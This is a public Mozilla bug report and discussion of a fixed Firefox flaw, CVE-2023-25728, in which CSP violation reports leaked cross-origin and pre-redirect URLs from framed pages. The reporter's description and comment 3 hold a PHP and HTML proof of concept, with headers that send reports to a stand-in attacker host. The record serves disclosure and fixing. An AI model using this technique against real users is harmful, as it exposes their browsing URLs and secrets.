Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Security#DOM%3A%20Security)

DOM: Security
▾

Core :: DOM: Security
Native content-based security features including: Content Security Policy (CSP), Mixed Content Blocker (MCB), and Safe Browsing.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Security&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Security&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Security)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P2

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S2

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

111 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| a11y-review | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr102 | [110+](/buglist.cgi?f1=cf_tracking_firefox_esr102&o1=equals&v1=110%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=fixed) |
| firefox109 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox109&o1=equals&v1=wontfix) |
| firefox110 | [+](/buglist.cgi?f1=cf_tracking_firefox110&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox110&o1=equals&v1=fixed) |
| firefox111 | [+](/buglist.cgi?f1=cf_tracking_firefox111&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr102 | 110+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox109 |  | wontfix |
| firefox110 | + | fixed |
| firefox111 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: johanaxelcarlsson, Assigned: tschuster)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/643f0847a3bf01b6ac23263f1661d14e?d=mm&size=40)  [tschuster](/user_profile?user_id=703078)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/abed191c548df3d9456f2ddff0b0498f?d=mm&size=40)  [johanaxelcarlsson](/user_profile?user_id=695595)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=40)  [freddy](/user_profile?user_id=428608)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

12 people

## References

### ( [URL](https://joaxcar.com/frame.php?url=YOUR_SERVER "https://joaxcar.com/frame.php?url=YOUR_SERVER") )

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[joaxcar.com/frame.php?url=YOUR\_SERVER](https://joaxcar.com/frame.php?url=YOUR_SERVER "https://joaxcar.com/frame.php?url=YOUR_SERVER")

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2021-23969](/show_bug.cgi?id=1542194 "VERIFIED FIXED - CSP violation information contains URL of redirect started from client-side code"), [CVE-2021-23968](/show_bug.cgi?id=1687342 "VERIFIED FIXED - Firefox leaks full redirect path via CSP violation reports")

## Details

### (4 keywords, Whiteboard: [reporter-external] [client-bounty-form] [verif?][domsecurity-active][adv-main110+][adv-esr102.8+], [wptsync upstream])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2023-25728

[Keywords:](/describekeywords.cgi)

[csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][domsecurity-active][adv-main110+][adv-esr102.8+], [wptsync upstream]

QA Whiteboard:

[post-critsmash-triage]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a12216484_1689 "2 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (5 files)

| [Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb](/attachment.cgi?id=9310389)  [2 years ago](#c10)  [Tom Schuster](/user_profile?user_id=703078)   48 bytes, text/x-phabricator-request | pascalc : [approval-mozilla-beta+](#c34 "2 years ago")  tjr : [sec-approval+](#c17 "2 years ago") | [Details](/attachment.cgi?id=9310389&action=edit) | [Review](/attachment.cgi?id=9310389) |
| --- | --- | --- |
| [Bug 1790345 - Add WPT for censored cross-origin URI in CSP report. r?freddyb](/attachment.cgi?id=9310641)  [2 years ago](#c11)  [Tom Schuster](/user_profile?user_id=703078)   48 bytes, text/x-phabricator-request |  | [Details](/attachment.cgi?id=9310641&action=edit) | [Review](/attachment.cgi?id=9310641) |
| [Bug 1790345 - ESR102: Introduce effective directive. r?freddyb](/attachment.cgi?id=9313224)  [2 years ago](#c19)  [Tom Schuster](/user_profile?user_id=703078)   48 bytes, text/x-phabricator-request | pascalc : [approval-mozilla-esr102+](#c36 "2 years ago")  tjr : [sec-approval+](#c25 "2 years ago") | [Details](/attachment.cgi?id=9313224&action=edit) | [Review](/attachment.cgi?id=9313224) |
| [Bug 1790345 - ESR102: Strip cross-origin URIs in frame-src CSP reports. r?freddyb](/attachment.cgi?id=9313225)  [2 years ago](#c20)  [Tom Schuster](/user_profile?user_id=703078)   48 bytes, text/x-phabricator-request | pascalc : [approval-mozilla-esr102+](#a12362869_24572 "2 years ago")  tjr : [sec-approval+](#c24 "2 years ago") | [Details](/attachment.cgi?id=9313225&action=edit) | [Review](/attachment.cgi?id=9313225) |
| [advisory.txt](/attachment.cgi?id=9317083)  [2 years ago](#c43)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   261 bytes, text/plain |  | [Details](/attachment.cgi?id=9317083&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [johanaxelcarlsson](/user_profile?user_id=695595)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1790345#c0)• 2 years ago |
|  | |

I had some difficulties to give this a proper name, but I hope it can be clarified by the content of the report. Please rename it as you see fit.

I have found an issue in Firefox implementation of CSP reporting directives, that can be used by a malicious user to leak full URL's (Including scheme, authorization, domain, port, path and query. Only excluding fragment) from a victim user's cross-origin (and cross site) activity. This can in the worst case leak highly sensitive information such as OAuth codes, user form content and similar information present in URLs.

The problem arise due to a flaw in the implementation of handling of redirects in CSP reporting directives. A malicious user can create a page with a "Content-Security-Policy-Report-Only" header that restrict what URLs are frameable in the page. Assuming this header

Content-Security-Policy-Report-Only: frame-src 'none'; report-uri <https://example.com>

Any attempt of framing a page will result in a violation and a report being sent to <https://example.com>. This report will contain some information of the violation and in particular it will contain the "blocked-uri". To avoid leaking cross-origin information, w3c specs have some restrictions on what is allowed in the blocked-uri part of the report. See

<https://w3c.github.io/webappsec-csp/#security-violation-reports>

The above link seems to only discuss redirects (which I will describe as problem number 1 below), but this page on MDN

<https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#sample_violation_report>

also suggests that the full path should be redacted even on initial cross-origin requests.

> "As you can see, the report includes the full path to the violating resource in blocked-uri. This is not always the case. For example, if the signup.html attempted to load CSS from <http://anothercdn.example.com/stylesheet.css>, the browser would not include the full path, but only the origin (<http://anothercdn.example.com>)"

The current implementation in Firefox break these rules in two ways:

## Leaking cross-origin information in blocked-uri on original request

As you can read in my second link above, Mozilla states that when making a cross-origin request that is blocked by a CSP rule, the "blocked-uri" part of the report should only include the origin. This is not the case in Firefox at the moment. Given the CSP header

Content-Security-Policy-Report-Only: frame-src 'none'; report-uri <https://attacker.example.com>

And the page content

<iframe src="[https://a:a@sub1.example.com/links.html?test=test#test"></iframe>](https://a:a@sub1.example.com/links.html?test=test#test%22%3E%EF%BF%BD/iframe%3E)

Will result in a report sent with this information

"blocked-uri": "<https://a:a@sub1.example.com/links.html?test=test>"

This is in contrast to Chrome and Safari that will respond with this report

"blocked-uri": "<https://sub1.example.com>"

This is probably a minor issue as the user in control of the main page (implementing the CSP) could possibly access DOM object and get similar information. But there might be edge cases where this is an unwanted leakage.

## Leaking cross-origin full URLs when a framed page redirects

A lot worse than the above leak is how Firefox handles "in-frame redirects" from cross-origin content. This attack is a proper bug and not only an interpretation of the specs.

By setting a Content-Security-Policy-Report-Only instead of a Content-Security-Policy a malicious page can frame another page, and the victim user will be able to navigate this embedded page without any notification that all navigation will violate the CSP and thus send reports to the configured report-uri. Normal cross-origin navigation in such a frame will result in a report containing blocked-uri of only the violating origin (as it should). Like this

"blocked-uri": "<https://sub1.example.com>"

And even if the attacker can "trace" the user's action through origins this way, I think that this is "by design" that all subsequent navigation also triggers the CSP violation. The big problem though is when any subsequent navigation encounters a redirect, then Firefox generates two violation reports, one containing only the origin but one containing the full pre-redirect URL. To make an example (with frame-src 'none')

1. Page attacker.com embeds victim1.com in an iframe (this will trigger a first report containing the full URL as per the first issue above)
2. victim.com contains a link to <https://victim2.com/test?test=test>, clicking it will trigger a regular report containing only the origin of victim2.com
3. victim2.com contains a link to <https://victim3.com/test?test=test> but victim3.com redirects to victim3.com/login now (because of the redirect) there will be two reports generated. One containing the origin of victim3 but also one containing the full pre redirect URL <https://victim3.com/test?test=test>

Notice that the attacker's page which is at a completely different origin (and site), will leak data from a cross origin embedded page. Redirects like these are quite common when a user either use some OAuth flows and also when pages deal with form data requests, making the likelihood of a redirect containing sensitive data high.

A restriction to this attack is that the victim page must be frameable.

## Example

To test this behavior you can use my example page. I host a PHP page that will add a CSP-report url given as a query parameter. This page will frame another page hosted on GitHub pages. The GitHub pages are configured with a custom domain. So when trying to access the GitHub page directly, it will make a redirect to the configured domain. This was the easiest way for me to show off the impact, it can probably be easier researched by setting up some properly hosted domains (or spoof them with /etc/hosts)

1. Set up some sort of "catch server" to collect the CSP reports (i used webhook.site for this)
2. Go to <https://joaxcar.com/frame.php?url=YOUR_SERVER> (and replace YOUR\_SERVER with the catch server)
3. The page will contain one frame at the top just proving the first described issue (the page does not exist, but the report is sent anyway). Then the page contains a frame of my page <https://sub1.joaxcar.com> this page contains one regular link, one link that will cause a redirect and one form that on submission will make a redirect. Click around
4. Check the report logs

## Verions

Tested on version 104.0.2 (64-bit) on Mac-OS 12.5.1

## Test code

PHP site:

```
<?php
    header("Content-Security-Policy-Report-Only: frame-src 'none'; img-src 'none'; report-uri " . $_GET["url"]);
?>
<html>
    <body>
        <h2>A frame to test leakage of embeded cross origin resource</h2>
        <iframe src="https://a:a@sub1.example.com/links.html?test=test#test"></iframe>
        <h2>A frame to test embeded cross origin navigation</h2>
        <iframe src="https://sub1.joaxcar.com/links.html"></iframe>
    </body>
</html>

```

HTML site hosted on other origin:

```
<html>
  <head></head>
  <body>
    <a href="https://sub1.joaxcar.com/links.html?code=123abc#test">regular link</a>
    <br/>
    <a href="https://joaxcar.github.io/sop/links.html?code=123abc#test">redirect link</a>
    <br/>
    <h3>Redirect form</h3>
    <form action="https://joaxcar.github.io/sop/links.html">
      <input type=text name=text value=test>
      <input type=submit>
    </form>
  </body>
</html>

```

Please ask if anything is unclear, as I had some trouble minifying the POC

Flags: sec-bounty?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a20316_159069)• 2 years ago |

Group: firefox-core-security → dom-core-securityComponent: Security → DOM: SecurityProduct: Firefox → Core

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1790345#c1)• 2 years ago |
|  | |

Christoph, could you figure out what to do with this? Thanks.

Flags: needinfo?(ckerschb)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1790345#c2)• 2 years ago |
|  | |

I believe this might be a duplicate bug or at least a known bug... If I remember correctly, we had a different leak in the past and we fixed it by reporting the exact writing of the URL as found in the HTML code.

A leak would be more problematic if the report contained something that is not in the URL.

What happens if you frame a web page that re-uses ambient information (e.g., on a page `https://example.com/?secret` which then embeds `<frame src="#foo">` - would it leak `#foo` or `https://example.com/?secret#foo`?

Flags: needinfo?(ckerschb) → needinfo?(johanaxelcarlsson)

|  | [johanaxelcarlsson](/user_profile?user_id=695595)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1790345#c3)• 2 years ago |
|  | |

So first of, I believe that the framing document's CSP will not get inherited into the framed document. Thus, any "frames inside the frame" will not have any extra impact. But I think that I might not have described the scenario in the best way, and will try to clarify. The URLs here are from my test site <https://joaxcar.com/frame.php>

A page (controlled by what we can call "the attacker") can add a CSP containing

```
Content-Security-Policy-Report-Only: frame-src 'none'; report-uri https://attacker.example.com

```

which will send a report to the attackers server whenever anything is framed in the page. Now the attacker also adds this iframe on the page

```
<iframe src="https://sub1.joaxcar.com/links.html"></iframe>

```

This will trigger a report about `https://sub1.joaxcar.com/links.html` and this is (as you noted) not awfully leaky, even if the other browsers strip this to only origin. But the interesting part comes when the victim user now uses the framed page (as the CSP is report only it will allow the page to function). If the user performs any normal navigation inside the iframe a report will be generated with a warning of a new page being framed.

This time only the origin will be reported. Clicking this link in the iframe

```
<a href="https://example.com/links.html?code=123abc#test">regular link</a>

```

will give the report

```
"blocked-uri": "https://example.com/"

```

And note that on my test page these URLs are to the same origin, but this should not matter. The browser is now reporting about URLs that are **not** part of the HTML. The framing page have **no** access to the HTML code of the cross origin iframe.

But now to the leak. If any navigation inside the iframe would lead to a redirect, Firefox will send two reports. One containing the redacted "only origin" blocked-url but also one containing the full pre-redirect URL. So given this link (inside the cross origin frame)

```
<a href="https://redirecting-example.com/links.html?code=123abc#test">regular link</a>

```

The generated reports would contain

```
https://redirecting-example.com/sop/links.html?code=123abc
and
https://redirecting-example.com

```

And as you can see one of the reports leak information of a URL that should be out of bounds for the attacker. It is not accessible in the page HTML.

These redirects can be caused by for example a form GET submit to a page that will answer with a 301 redirect, or some form of login flow.

On my example page <https://joaxcar.com/frame.php?url=ATTACKER_SERVER> the framed page is <https://sub1.joaxcar.com> and clicking the redirect link in the iframe will leak URLs from <https://joaxcar.github.io> for example this one

```
"blocked-uri": "https://joaxcar.github.io/sop/links.html?text=test",

```

I hope that this makes the issue clearer. I think the bug is located somewhere in the logic that is supposed to block leakage when a framed page is redirecting. But that this code is not considering subsequent redirects but only redirects initiated by the actual src attribute.

Does this help, or should I create a better PoC or add any other info/video?

Thanks for looking in to it

Flags: needinfo?(johanaxelcarlsson) → needinfo?(fbraun)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1790345#c4)• 2 years ago |
|  | |

OK, thanks for the follow-up. This is a better explanation.

I'll write an automated test for scenario in [comment 3](/show_bug.cgi?id=1790345#c3 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") and dveditz also suggests writing a test for another interesting case:

* The attacker page is allow-listing the frame (also an attacker page), which then redirects or navigates to a victim page. Does that leak?
Assignee: nobody → fbraunFlags: needinfo?(fbraun)Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][domsecurity-active]

|  | [johanaxelcarlsson](/user_profile?user_id=695595)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1790345#c5)• 2 years ago |
|  | |

I did some manual testing on the scenario where some domains are whitelisted and some are not, also using real CSP and not report-only (thus actually blocking the page)

If you visit <https://joaxcar.com/frame3.php?url=ATTACKER_SERVER> and click the link "tiny url" in the iframe the site tinyurl.com is blocked by CSP and thus stopped before any redirect. It will send a report with only the origin of tinyurl.com to your server.

If you instead go to <https://joaxcar.com/frame2.php?url=ATTACKER_SERVER> and click the same link, tinyurl.com is now whitelisted and the block will take place after the redirect. The report will now contain the full tinyurl URL including path and query.

Note here: what is leaked is the full URL of the **pre-redirect** request, but the block is on the **post-redirect** URL. Still the pre-redirect (link) URL is located cross origin from the framing outer page (joaxcar.com) and should thus not leak to the framing page report url.

From an attackers point of view I guess the "report-only" mode is more valuable as you can trace a users actions. But the "regular CSP" one is probably more prevalent in the wild as a side effect of pages configuration. Possibly leaking user info unintentionally.

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1790345#c6)• 2 years ago |
|  | |

The severity field is not set for this bug.

:freddy, could you have a look please?

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#workflow.2Fno_severity.py).

Flags: needinfo?(fbraun)

|  | [johanaxelcarlsson](/user_profile?user_id=695595)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1790345#c7)• 2 years ago |
|  | |

Hi again :freddy , did you manage to reproduce this? Or do I need to provide a better/alternative PoC?

Best regards

Johan

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a7474492_1689)• 2 years ago |

Flags: needinfo?(dveditz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a8079986_1689)• 2 years ago |

Status: UNCONFIRMED → NEWEver confirmed: trueFlags: needinfo?(dveditz)Keywords: [csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[sec-low](/buglist.cgi?keywords=sec-low&resolution=---)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1790345#c8)• 2 years ago |
|  | |

Tom, can you take a look? This looks like it might be in your wheelhouse.

Flags: needinfo?(fbraun) → needinfo?(tschuster)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a9676718_703078)• 2 years ago |

Assignee: fbraun → tschusterFlags: needinfo?(tschuster)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1790345#c9)• 2 years ago |
|  | |

Chrome simply strips cross-origin URLs used for frame-src down to the bare origin. We should just do the same.

```
  // Until we're more careful about the way we deal with navigations in frames
  // (and, by extension, in plugin documents), strip cross-origin 'frame-src'
  // and 'object-src' violations down to an origin. https://crbug.com/633306

```

[https://source.chromium.org/chromium/chromium/src/+/main:third\_party/blink/renderer/core/frame/csp/content\_security\_policy.cc;l=855-865;drc=b1873cad20e18ff8afc0db995c4ac580ba051e42](https://source.chromium.org/chromium/chromium/src/%2B/main%3Athird_party/blink/renderer/core/frame/csp/content_security_policy.cc;l=855-865;drc=b1873cad20e18ff8afc0db995c4ac580ba051e42)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1790345#c10)• 2 years ago |
|  | |

Attached file
[Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb](attachment.cgi?id=9310389)
— [Details](attachment.cgi?id=9310389&action=edit)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1790345#c11)• 2 years ago |
|  | |

Attached file
[Bug 1790345 - Add WPT for censored cross-origin URI in CSP report. r?freddyb](attachment.cgi?id=9310641)
— [Details](attachment.cgi?id=9310641&action=edit)

Depends on D165818

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1790345#c12)• 2 years ago |
|  | |

Landed: <https://hg.mozilla.org/integration/autoland/rev/c42c459d2be658998bea60d024fe8a9dde24938c>

Backed out for causing mochitest failures in test\_blocked\_uri\_in\_violation\_event\_after\_redirects.html:

<https://hg.mozilla.org/integration/autoland/rev/2387b4292a52b99ef3e1e9fdc3d54424f4058265>

[Push with failures](https://treeherder.mozilla.org/jobs?repo=autoland&group_state=expanded&collapsedPushes=1155668&searchStr=android%2C7.0%2Cx86-64%2Clite%2Cwebrender%2Copt%2Cmochitests%2Cwithout%2Cfission%2Cenabled%2Ctest-android-em-7.0-x86_64-lite-qr%2Fopt-geckoview-mochitest-plain-nofis%2C1&revision=c42c459d2be658998bea60d024fe8a9dde24938c&selectedTaskRun=ZfKJdBg2SQejD9teVR_f7A.0)

[Failure log](https://treeherder.mozilla.org/logviewer?job_id=401960644&repo=autoland&lineNumber=1915)

> TEST-UNEXPECTED-FAIL | dom/security/test/csp/test\_blocked\_uri\_in\_violation\_event\_after\_redirects.html | sanity: how can we end up here?

Flags: needinfo?(tschuster)

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1790345#c13)• 2 years ago |
|  | |

Interesting, we apparently started to censor the URLs when actually blocking in [bug 1542194](/show_bug.cgi?id=1542194 "VERIFIED FIXED - CSP violation information contains URL of redirect started from client-side code").

Flags: needinfo?(tschuster)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1790345#c14)• 2 years ago |
|  | |

My earlier security rating was grossly wrong. A same-origin-policy-violating URL leak is normally `sec-high` like [bug 1542194](/show_bug.cgi?id=1542194 "VERIFIED FIXED - CSP violation information contains URL of redirect started from client-side code").

Unconditionally truncating a blocked <iframe src=> URL to origin as Chrome apparently does ([comment 9](/show_bug.cgi?id=1790345#c9 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)")) is wrong, but minor compared to a cross-origin URL leak. I can live with it if that's what we have to do; since that's what Chrome and Safari do ([comment 0](/show_bug.cgi?id=1790345#c0 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)")) I hope that won't cause any problems.

But missing truncation isn't the only problem we have!

1. not truncating cross-origin URLs is a cross-origin leak
2. we're reporting the wrong origin!
3. we're not blanking out the frame when a blocked URL is clicked—unless there's a redirect

#1 is obviously the worst issue, but #2 is worrying, too. If we're reporting the wrong URL are we using that URL in any decisions?

#3 is trivial and we could put it in another bug, or even ignore it. Either behavior could be justified—if only it weren't inconsistent!

Keywords: [csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[sec-low](/buglist.cgi?keywords=sec-low&resolution=---) → [csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)See Also: → [CVE-2021-23969](/show_bug.cgi?id=1542194 "VERIFIED FIXED - CSP violation information contains URL of redirect started from client-side code")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1790345#c15)• 2 years ago |
|  | |

Rereading [§2.4.2 of the CSP spec](https://w3c.github.io/webappsec-csp/#create-violation-for-request) we are correct to report the pre-redirect URL. I think Chrome is incorrect to report `https://example.com` for the "<https://tinyurl.com/yc3kar5f?test=test>" link. Note that in a non-frame subresource Chrome does report the pre-redirect URL. For example, check the console after loading:

data:text/html,<meta http-equiv="content-security-policy" content="img-src [https://tinyurl.com">Hi](https://tinyurl.com%22%3EHi) there<script>window.addEventListener("securitypolicyviolation",(e)=>{console.log(e)})</script><img id=test src=[https://tinyurl.com/yc3kar5f?test=test>](https://tinyurl.com/yc3kar5f?test=test%3E)

I think we're OK on that score so my #2 is not a problem after all. #3 we can ignore or file as a new bug (that no one's going to have time to work on). We only have to worry about truncating those cross-origin violations in this bug.

You could argue we should always report the <iframe src=> url instead because even just reporting the truncated origin of link clicks reveals information about what the user is doing that the parent page wouldn't otherwise know. That wouldn't be very useful—maybe we shouldn't bother to report navigation blocks inside a frame. Go ahead and block, and show our console errors to help developers debug, but don't send violation events or reports. Will have to raise a spec issue on that. For now, we'll just fix the missing truncation.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a10849680_1689)• 2 years ago |

See Also: → [CVE-2021-23968](/show_bug.cgi?id=1687342 "VERIFIED FIXED - Firefox leaks full redirect path via CSP violation reports")

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1790345#a10882481_428608)• 2 years ago |

Severity: -- → S2Status: NEW → ASSIGNEDPriority: -- → P2

|  | [Tom Schuster](/user_profile?user_id=703078)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1790345#c16)• 2 years ago |
|  | |

Comment on [attachment 9310389](/attachment.cgi?id=9310389 "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") [[details]](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - Strip cross-origin URIs in frame-src CSP reports. r?freddyb

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: There is no exploit, but the info leak is pretty easy to reconstruct based on the test changes.

(We previously landed this patch when it was still rated sec-low)

* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: Yes
* **Which older supported branches are affected by this flaw?**: all
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Fixing this in ESR102 is going to be difficult. This patch relies on changes made in [bug 1529337](/show_bug.cgi?id=1529337 "RESOLVED FIXED - Implement CSP 'script-src-elem' and 'script-src-attr' directives"). (The effective-directive parameter aEffectiveDirective)
* **How likely is this patch to cause regressions; how much testing does it need?**: This only changes what we put into CSP reports, very unlikely to cause any regressions visible to the user.
* **Is Android affected?**: Yes
[Attachment #9310389](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") -
Flags: sec-approval?

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1790345#c17)• 2 years ago |
|  | |

Comment on [attachment 9310389](/attachment.cgi?id=9310389 "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb") [[details]](/attachment.cgi?id=9310389&action=edit "Bug 1790345 - Strip cross-origin URIs in frame-src CSP reports. r?freddyb")

[Bug 1790345](/show_bug.cgi?id=1790345 "RESOLVED FIXED - CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)") - Strip cross-origin URIs in frame-src CSP reports. r?freddyb

It sounds like we need to confirm that we can produce a patch for ESR; assuming we can then we can land this. But until we know what we're going to do for that we should hold off.

